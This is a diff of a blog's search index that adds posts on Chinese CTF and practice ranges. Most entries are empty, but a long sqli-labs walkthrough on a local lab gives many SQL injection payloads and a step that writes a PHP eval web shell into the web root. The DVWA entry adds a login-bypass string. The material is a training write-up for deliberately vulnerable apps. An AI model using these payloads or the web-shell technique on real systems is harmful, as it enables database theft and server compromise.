@@ -4,9 +4,361 @@
   
     
     <entry>
+      <title>hackinglab</title>
+      <link href="2021/05/30/ctf/hackinglab/"/>
+      <url>2021/05/30/ctf/hackinglab/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xctf</title>
+      <link href="2021/05/30/ctf/xctf/"/>
+      <url>2021/05/30/ctf/xctf/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>掌控安全封神台</title>
+      <link href="2021/05/30/ctf/zhang-kong-an-quan-feng-shen-tai/"/>
+      <url>2021/05/30/ctf/zhang-kong-an-quan-feng-shen-tai/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ctfshow</title>
+      <link href="2021/05/28/ctf/ctfshow/"/>
+      <url>2021/05/28/ctf/ctfshow/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hack the box</title>
+      <link href="2021/05/28/ctf/hack-the-box/"/>
+      <url>2021/05/28/ctf/hack-the-box/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>wargames</title>
+      <link href="2021/05/28/ctf/wargames/"/>
+      <url>2021/05/28/ctf/wargames/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>vulhub靶场</title>
+      <link href="2021/05/18/web-an-quan/vulhub-ba-chang/"/>
+      <url>2021/05/18/web-an-quan/vulhub-ba-chang/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>bugkuctf</title>
+      <link href="2021/05/18/ctf/bugkuctf/"/>
+      <url>2021/05/18/ctf/bugkuctf/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>owaspbwa靶场</title>
+      <link href="2021/05/18/web-an-quan/owaspbwa-ba-chang/"/>
+      <url>2021/05/18/web-an-quan/owaspbwa-ba-chang/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pikachu靶场</title>
+      <link href="2021/05/18/web-an-quan/pikachu-ba-chang/"/>
+      <url>2021/05/18/web-an-quan/pikachu-ba-chang/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss-labs靶场</title>
+      <link href="2021/05/18/web-an-quan/xss-labs-ba-chang/"/>
+      <url>2021/05/18/web-an-quan/xss-labs-ba-chang/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>墨者学院</title>
+      <link href="2021/05/18/ctf/mo-zhe-xue-yuan/"/>
+      <url>2021/05/18/ctf/mo-zhe-xue-yuan/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dvwa靶场</title>
+      <link href="2021/05/17/web-an-quan/dvwa-ba-chang/"/>
+      <url>2021/05/17/web-an-quan/dvwa-ba-chang/</url>
+      
+        <content type="html"><![CDATA[<h2 id="brute-force"><a href="#brute-force" class="headerlink" title="brute force"></a>brute force</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>1）跑字典，暴力破解</p><p><img src="https://z3.ax1x.com/2021/05/17/gW95wt.png"></p><p>2）sql注入</p><p>admin’ or ‘1’=’1</p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sqli-labs靶场</title>
+      <link href="2021/05/16/web-an-quan/sqli-labs-ba-chang/"/>
+      <url>2021/05/16/web-an-quan/sqli-labs-ba-chang/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><pre class=" language-shell"><code class="language-shell">mysql -h localhost -u root -p //-h代表地址，-u代表用户，-p后面是密码show databases; //显示数据库show tables; //显示表use database; //use security;来切换到security数据库select * from users; //选择这个users表，展示，*可以改成列名，则单独显示几列select schema_name from information_schema.schemata; //查库:查information_schema这个指定的数据库的schemata表中schema_name这个列中所记录库的信息select table_name from information_schema.tables where table_schema='security'; //查表:查指定数据库security的表select column_name from information_schema.columns where table_name='users'; //查列select username,password from security.users; //查字段select * from users where id='1' limit 0,1; //表示显示users表中行中id=1的，且从1开始，显示1个select * from users order by 3; //在users表中，给第三列排序，因此可以用来判有多少列select * from users union select 1,2,3; //判断回显地方select system_user(); //显示系统用户select user();select database(); //显示当前选择的数据库是什么select version(); //显示mysql数据库的版本select @@datadir; //mysql的安装路径select @@version_compile_os; //本机的操作系统group_concat(); //将所有的数据连接拼接之后显示concat_ws('~',a,b); //同时取出a，b中间用~间隔select left(database(),1)='s'; //截取当前选择的数据库的第一位看是不是's'，如果是，则返回1，否则返回0select left(database(),2); //直接返回前两位 ‘in’select user() regexp 'r'; //查看匹配的user()开头是不是r，正则表达式，正确返回1，错误为0select user() like 'r%'; //查看匹配的user()开头是不是r，正则表达式，正确返回1，错误为0select substr((select database()),2,1)='n'; //从第2位开始，截取数据库名字字符串长度为1，一样则返回1，不一样返回0select ascii('s'); //返回s的ascii值，在python中有chr和ord两个，用ipython打开，通常和前两个配额和使用select ascii(substr((select database()),1,1));select 'batman' into outfile'c:\\phpstudy\\www\\sqli-labs\\less-7\\test.txt'; //是为了防止关键字转义select load_file'c:\\phpstudy\\www\\sqli-labs\\less-7\\test.txt'; //读函数select if(2>3,1,2); //判断2>3的结果，若成立则返回1，不成立返回2sleep(3); //睡三秒，可以和上面的一起使用select if(2>3,1,sleep(3));组合搭配select if(ascii(substr((select database()),1,1))>10,2,3);select 1=1 and 1=2;select 1=1 or 1=2;--+和-- 这两种适用于get方式，不适用在post方式，因为传递过程中会设计转码问题，所以我们通常都用#select * from users where user_id='1';select * from users where user_id='1111' or 1=1 #~ --> 0x7eusers --> 0x7573657273#xpath报错注入：select updatexml(1,concat(0x7e,(select username from security.users limit 1,1),0x7e),1);</code></pre><h2 id="SQLi-LABS-Page-1-Basic-Challenges"><a href="#SQLi-LABS-Page-1-Basic-Challenges" class="headerlink" title="SQLi-LABS Page-1*(Basic Challenges)*"></a>SQLi-LABS Page-1*(Basic Challenges)*</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>首先，正常如果标题不告诉我们是字符注入的话，我们首先先要区分是字符型还是数字型，可以构造</p><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1+1%EF%BC%8C%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BC%9A%E8%A2%AB%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BC%9A%E5%88%99%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%EF%BC%8C%E5%8F%8D%E4%B9%8B%E4%B8%BA%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%8C%E6%AD%A4%E5%A4%96%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88id%E7%9A%84%E5%80%BC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF">http://127.0.0.1/sqli-labs/Less-1/?id=1+1，判断是否会被执行，如果会则是数字型，反之为字符型，此外判断闭合id的值是什么，可能是</a></p><pre class=" language-shell"><code class="language-shell">'")')")‘))"))</code></pre><p>因此我们要挨个尝试，构造</p><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id='">http://127.0.0.1/sqli-labs/Less-1/?id='</a>    先大概判断下闭合词，如果是’，则</p><p><img src="https://z3.ax1x.com/2021/05/16/gc8dMt.png"></p><p>如果不是’，而是”,则无法被执行，则没有回显提示。</p><p><img src="https://z3.ax1x.com/2021/05/16/gc8gRs.png"></p><p>接下来判断多少列 <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1%27%20order%20by%203%20--+">http://127.0.0.1/sqli-labs/Less-1/?id=1%27%20order%20by%203%20--+</a></p><p><img src="https://z3.ax1x.com/2021/05/16/gcJfET.png"></p><p>当order by 3可以，而order by 4不可以，就说明最多是三列，没有四列</p><pre><code>注释符可以用 --+，-- ，#,这里推荐#</code></pre><p>然后当我们确认有三列的时候，我们需要知道回显处，也就是前端和数据库交互显示的地方</p><p>构造<a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1'">http://127.0.0.1/sqli-labs/Less-1/?id=-1'</a> union select 1,2,3 –+</p><p><img src="https://z3.ax1x.com/2021/05/16/gcJbK1.png"></p><p>为什么是-1而不是1呢，因为如果是1，那么回显处会优先显示id=1的查询，所以要让前处查询不到</p><p><img src="https://z3.ax1x.com/2021/05/16/gcYVIS.png"></p><p>我们这里发现2和3的地方是回显处。那么我们可以选择在2，3处进行查库操作</p><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1'">http://127.0.0.1/sqli-labs/Less-1/?id=-1'</a> union select 1,2,schema_name from information_schema.schemata–+</p><p><img src="https://z3.ax1x.com/2021/05/16/gcYsIO.png"></p><p>可以通过改成</p><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1'">http://127.0.0.1/sqli-labs/Less-1/?id=-1'</a> union select 1,2,schema_name from information_schema.schemata    limit 0,1–+或者limit 1,1来进行改变，但是这种很慢，我们可以使用函数group_concat(schema_name)</p><p><img src="https://z3.ax1x.com/2021/05/16/gcYOQs.png"></p><p>同理，我们现在查表<a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1'">http://127.0.0.1/sqli-labs/Less-1/?id=-1'</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="https://z3.ax1x.com/2021/05/16/gcNejs.png"></p><p>之后查列</p><p><img src="https://z3.ax1x.com/2021/05/16/gcNzPU.png"></p><p>再之后查用户名，密码，group_concat和concat_ws配合使用</p><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1'">http://127.0.0.1/sqli-labs/Less-1/?id=-1'</a> union select 1,2,group_concat(concat_ws(‘~’,password,username)) from security.users –+</p><p><img src="https://z3.ax1x.com/2021/05/16/gcUsoV.png"></p><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>这里，我们首先先</p><p><a href="http://127.0.0.1/sqli-labs/Less-2/?id=1'">http://127.0.0.1/sqli-labs/Less-2/?id=1'</a> 发现报错了，于是尝试其余，发现都保错，最后发现其实根本不用关键词过滤，查看比对less-1和less-2的源码发现</p><p>less-1：$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p><p>less-2：$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p><p>所以和less-1一样，直接操作就行</p><p>1）order by 查看列</p><p>2）查库</p><p>3）查表</p><p>4）查列</p><p>5）查用户名密码</p><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>当我们尝试了id=1’)发现可行</p><p><img src="https://z3.ax1x.com/2021/05/16/gcaH7q.png"></p><p>发现下面提示用’)包裹</p><h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><p>同之前，遍历，发现用”)包裹</p><h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>当我们看到这题时发现不是1-4题那么，这是典型的<strong>布尔盲注</strong>，当正确时返回结果，当错误时报错或者不反回，这种题的做法就是通过判断某位字符是否相等来获取信息</p><p>id=1’发现为’包裹</p><p>1）order by 3 发现列</p><p>2）直接union select联合查询</p><p><a href="http://127.0.0.1/sqli-labs/Less-5/?id=1'">http://127.0.0.1/sqli-labs/Less-5/?id=1'</a> and left((select database()),1) =’s’–+</p><p><img src="https://z3.ax1x.com/2021/05/16/gc0CY6.png"></p><p>但是我们手工太慢了，可以使用burpsuite暴力破解功能，通过观看返回的字节数判断成功与否，首先抓包分析，发到intruder爆破模块</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><img src="https://z3.ax1x.com/2021/05/16/gc0t7n.png"></p><p>然后设置变量，以及爆破的字典，长度</p><p><img src="https://z3.ax1x.com/2021/05/16/gcBB5t.png"></p><p>设置线程数量，右上角开始start attack</p><p><img src="https://z3.ax1x.com/2021/05/16/gcBfVs.png"></p><p>发现只有当s时长度不一样，所以我们确信第一位为s，同理来逐渐爆破剩下的</p><p><img src="https://z3.ax1x.com/2021/05/16/gcBbMF.png"></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>select ascii(substr((select database()),1,1))&gt;1;</p><p><img src="https://z3.ax1x.com/2021/05/16/gcrj9x.png"></p><p>以此通过二分法判断出首字母，进而第二位，第三位……</p><h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><p>同样id=1‘ ，id=1”，发现“时报错，说明是”过滤</p><p><img src="https://z3.ax1x.com/2021/05/16/gcs2rD.png"></p><p>之后和less-5一样了。</p><h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>发现包裹用“))包裹</p><p>写入木马</p><p><a href="http://127.0.0.1/sqli-labs/Less-7/?id=-1'">http://127.0.0.1/sqli-labs/Less-7/?id=-1'</a>)) union select 1,2,’<!--?php @eval($_POST["ad"])?-->‘ into outfile ‘E:\PHPstudy\phpstudy_pro\WWW\sqli-labs\Less-7\2.php’ –+</p><p><img src="https://z3.ax1x.com/2021/05/16/gc66BD.png"></p><p><img src="https://z3.ax1x.com/2021/05/16/gc6cHe.png"></p><p>直接用菜刀或者蚁剑连</p><p><img src="https://z3.ax1x.com/2021/05/16/gc6Ijf.png"></p><h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>同样，先id=1’，发现由‘包裹，所以和之前一样。</p><h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>和之前一样</p><h4 id="方法二-时间盲注（sleep）"><a href="#方法二-时间盲注（sleep）" class="headerlink" title="方法二-时间盲注（sleep）"></a>方法二-时间盲注（sleep）</h4><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1'">http://127.0.0.1/sqli-labs/Less-8/?id=1'</a> and if(length(database())=81,1,sleep(3))–+</p><p><img src="https://z3.ax1x.com/2021/05/16/gcgpRI.png"></p><h3 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h3><p>时间盲注</p><h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><p>时间盲注</p><h3 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h3><p>登录界面，是post传参，我们用burpsuite抓包，看看对方post中传递了什么</p><p> <img src="https://z3.ax1x.com/2021/05/17/g22f3j.png"></p><p>uname=’ ‘ &amp;passwd=’’ &amp;submit=Submit </p><p>或者</p><p>uname=admin’ or 1=1 # passwd=admin&amp;submit=Submit</p><p>这里的sql注入就是要提前闭合admin前的 ‘ ，但是由于不一样是单引号过滤，所以我们以后要尝试双引号，括号组合等</p><pre class=" language-shell"><code class="language-shell">'")')")‘))"))</code></pre><p>手工注入时需要我们一个个尝试，以后用sqlmap尝试。当我们登陆成功后返回了蓝色字体显示用户名和密码，接着我们要order by 3 判断有几列，然后联合查询，判断回显位置，进而查库查表查字段</p><p><img src="https://z3.ax1x.com/2021/05/17/g2W6fg.png"></p><p>发现只有两列，接着我们判断回显处</p><p><img src="https://z3.ax1x.com/2021/05/17/g2Wx76.png"></p><p>这里切记，不要输入正确的admin用户名否则位置会被uname和password回显遮盖上，接着我们在1和2处都可以进行sql注入</p><p>1）查库</p><p>uname=in’ union select 1,schema_name from information_schema.schemata  #  &amp;passwd= &amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/g2hmrR.png"></p><p>2）查表</p><p>uname=in’ union select 1,table_name from information_schema.tables where table_schema=’security’  #  &amp;passwd= &amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/g2haZt.png"></p><p>3）查列</p><p>uname=in’ union select 1,column_name from information_schema.columns where table_name=’users’  #  &amp;passwd= &amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/g2hHy9.png"></p><p>4）查字段</p><p>uname=in’ union select username,password from security.users #  &amp;passwd= &amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/g24POA.png"></p><p>5）通过group_concat(concat_ws(‘~’,username,password))批量查数据</p><p>uname=in’ union select 1,group_concat(schema_name) from information_schema.schemata  #  &amp;passwd= &amp;submit=Submit</p><p>uname=in’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’  #  &amp;passwd= &amp;submit=Submit</p><p>uname=in’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’  #  &amp;passwd= &amp;submit=Submit</p><p>uname=in’ union select 1,group_concat(concat(‘~’,username,password)) from security.users #  &amp;passwd= &amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/g2HYfx.png"></p><h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><p>先尝试admin’ or ‘1’=’1登录，发现失败，判断是否是其他关键字过滤，比如），”等，进行尝试</p><p>admin”) or 1=1 # </p><p><img src="https://z3.ax1x.com/2021/05/17/g2btEj.png"></p><p>接下来就和之前一样了。</p><h3 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h3><p>我们尝试登录，admin，admin登录成功后和less-12和less-13不一样，没有具体的数值回显，所以这又是一个布尔盲注，思路就是通过判断回显确定值</p><p><img src="https://z3.ax1x.com/2021/05/17/g2LFmD.png"></p><p>尝试，确定过滤词为’）</p><p><img src="https://z3.ax1x.com/2021/05/17/g2LK6f.png"></p><p>准备在命令行确定查询语句</p><pre class=" language-shell"><code class="language-shell">#时间盲注uname=ad') or if(length(database())>100,1,sleep(1)) #&passwd=&submit=Submit#暴力破解跑字符uname=ad') or substr((select database()),1,1)='a' #&passwd=&submit=Submit</code></pre><p><img src="https://z3.ax1x.com/2021/05/17/g2XdwF.png"></p><p>判断出数据库第一位是‘s’，同理第二位，第三位。。。就完成了</p><h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><p>和less-13一样，也是布尔盲注，首先先判断过滤词</p><p>发现admin” or 1=1 #成功，所以过滤词是”，接着除了过滤词，其他和less-13一样了</p><p><img src="https://z3.ax1x.com/2021/05/17/g2jg9s.png"></p><h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><p>和less-14，less-15一样，除了包裹词都一样 是’</p><p><img src="https://z3.ax1x.com/2021/05/17/g2jLg1.png"></p><h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><p>同上，包裹词是”）</p><p><img src="https://z3.ax1x.com/2021/05/17/g2vZb8.png"></p><h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><p>首先先admin，admin登录成功，然后老规矩我们尝试username栏进行注入，接连失败，之后我们进行源代码审计，发现’ “） 等都被处理了，所以我们无法在username一栏尝试，所以我们尝试password栏注入。构造</p><p>admin</p><p>adadas’#</p><p>登录成功，说明密码没有防止注入处理，所以接下来我们就是利用password处进行布尔盲注，通过图片判断</p><pre class=" language-shell"><code class="language-shell">updatexml(1,concat(0x7e,(构造语句),0x7e),1);构造语句：select schema_name from information_schema.schemata; //查库:查information_schema这个指定的数据库的schemata表中schema_name这个列中所记录库的信息select table_name from information_schema.tables where table_schema='security'; //查表:查指定数据库security的表select column_name from information_schema.columns where table_name='users'; //查列select username,password from security.users; //查字段#带入其中：updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata;),0x7e),1);updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security';),0x7e),1);updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users';),0x7e),1);updatexml(1,concat(0x7e,(select username,password from security.users;),0x7e),1);</code></pre><p>uname=admin&amp;passwd=’ or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)#&amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/gRVvAs.png"></p><p>通过xpath注入报错，显示出当前数据库名。</p><p>接着查表，列，字段</p><p>表：</p><p>uname=admin&amp;passwd=’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1)),1)#&amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/gRe0Rx.png"></p><p>列：</p><p>uname=admin&amp;passwd=’ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1)),1)#&amp;submit=Submit</p><p><img src="https://z3.ax1x.com/2021/05/17/gReWFA.png"></p><h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><p>less-18标题是头部注入，其实sql注入的本质就是在一切可以和数据库进行交互的地方绕过waf进行sql语句的查询，不是限于get，post方式，如下</p><pre class=" language-shell"><code class="language-shell">Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 38Origin: http://127.0.0.1Connection: keep-aliveReferer: http://127.0.0.1/sqli-labs/Less-18/Cookie: PHPSESSID=fv01tputk07gfclr0uvti40o80Upgrade-Insecure-Requests: 1</code></pre><p>其中，只要是和数据库交互的都可以注入。</p><p>首先，admin，admin登录成功后发现</p><p><img src="https://z3.ax1x.com/2021/05/17/gRn65d.png"></p><p>返回有ip地址，user-agent信息，还有用户名，当我们登录失败</p><p><img src="https://z3.ax1x.com/2021/05/17/gRn4r8.png"></p><p>当我们登录失败，只返回ip地址，所以我们知道首先ip是回显的，但是ip无法注入，所以我们的思路就是less-17题那样通过登陆成功后显示的user-agent或者用户名处回显，所以我们尝试用户名和密码处注入，结果失败，被转义了</p><p><img src="https://z3.ax1x.com/2021/05/17/gRuBzq.png"></p><p>在画圈圈处，后面username是要调用数据库查询的，而username本身转义，ip_address又无法改变，所以我们选择在uagent上动手。</p><pre class=" language-shell"><code class="language-shell">#构造如下短句' or updatexml(1,concat(0x7e,(database())),1) or '1'='1#用这样的方式进行闭合user-agent处，也可以闭合后门所有' or updatexml(1,concat(0x7e,(database())),1),'','')#</code></pre><p>可以在burpsuite中user-agent处进行添加</p><p><img src="https://z3.ax1x.com/2021/05/17/gR1kD0.png"></p><p>结果下面xpath处显示，结果也成功了</p><p><img src="https://z3.ax1x.com/2021/05/17/gR1Brt.png"></p><p>接下面将database()处换成查库，查表，查列，查字段</p><pre class=" language-shell"><code class="language-shell">' or updatexml(1,concat(0x7e,(database())),1),'','')#</code></pre><p>就可以了。</p><h3 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h3><p>输入admin，admin登录成功后，返回如图</p><p><img src="https://z3.ax1x.com/2021/05/17/gRJ2T0.png"></p><p>发现返回了referer，而登录失败后什么也不返回，所以我们这也要在referer进行注入，和header注入使用一样的句子</p><p><img src="https://z3.ax1x.com/2021/05/17/gRtGVI.png"></p><h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p>当我们登录成功后显示</p><p><img src="https://z3.ax1x.com/2021/05/17/gRNI1S.png"></p><p>所以这题的考点是cookie的注入，当我们再次登录时，如果cookie没变，会调用cookie，我们在本地地址的cookie处值后加上单引号</p><p><img src="https://z3.ax1x.com/2021/05/17/gRUMBd.png"></p><p>发现报错了，说明包裹词是单引号，我们成功闭合，接下来可以直接闭合，然后联合查询</p><p>但是首先，老规矩，order by 3和order by 4</p><p><img src="https://z3.ax1x.com/2021/05/17/gRapPP.png"></p><p>发现只有三列，然后union select 1,2,3</p><p><img src="https://z3.ax1x.com/2021/05/17/gRaMxU.png"></p><p><img src="https://z3.ax1x.com/2021/05/17/gRaGZ9.png"></p><p>找到了回显的地方，任选地方进行cookie注入</p><p>先是单查库</p><p><img src="https://z3.ax1x.com/2021/05/17/gRa2JP.png"></p><p>之后查表查列查字段，多组查询都可以了。</p><h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>登录，查看cookie，YWRtaW4%3D，base64进行解码发现是admin，白盒测试源代码审计发现过滤词是’)，所以我们构造</p><p>‘) union select 1,2,database()#</p><p>编码后是JykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw==，进行替换</p><p><img src="https://z3.ax1x.com/2021/05/17/gRDOr8.png"></p><p>接下来操作和less-20一样了。</p><h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>和less-21相似，只是包裹词从单引号变成了双引号。</p><h2 id="SQLi-LABS-Page-2-Adv-Injections"><a href="#SQLi-LABS-Page-2-Adv-Injections" class="headerlink" title="[SQLi-LABS Page-2 (Adv Injections)"></a>[SQLi-LABS Page-2 <em>(Adv Injections)</em></h2><h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>我们先按照要求构造</p><p>id=1’ –+</p><p>进行闭合，但是我们发现不成功，我们白盒测试查看原代码</p><p><img src="https://z3.ax1x.com/2021/05/17/gR6DL6.png"></p><p>在php中，preg_replace 函数执行一个正则表达式的搜索和替换。在/ /之中的#，- -，都被替换成空格，</p><p>所以我们要使用别的省略词，;%00。详见<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace</a>内容。</p><p>所以id=1’ ;%00，然后老规矩，order by，union select 1，2，3测试回显，然后查询就好了。</p><p>1）order by</p><p>2）union select </p><p>3）查库，查表，查列，查字段，和之前的都一样了</p><h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入，靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>中国移动智能网关及中国电信光猫的账号密码</title>
-      <link href="2021/03/08/zhong-guo-yi-dong-zhi-neng-wang-guan-ji-zhong-guo-dian-xin-guang-mao-de-zhang-hao-mi-ma/"/>
-      <url>2021/03/08/zhong-guo-yi-dong-zhi-neng-wang-guan-ji-zhong-guo-dian-xin-guang-mao-de-zhang-hao-mi-ma/</url>
+      <link href="2021/03/08/wu-xian-an-quan/zhong-guo-yi-dong-zhi-neng-wang-guan-ji-zhong-guo-dian-xin-guang-mao-de-zhang-hao-mi-ma/"/>
+      <url>2021/03/08/wu-xian-an-quan/zhong-guo-yi-dong-zhi-neng-wang-guan-ji-zhong-guo-dian-xin-guang-mao-de-zhang-hao-mi-ma/</url>
       
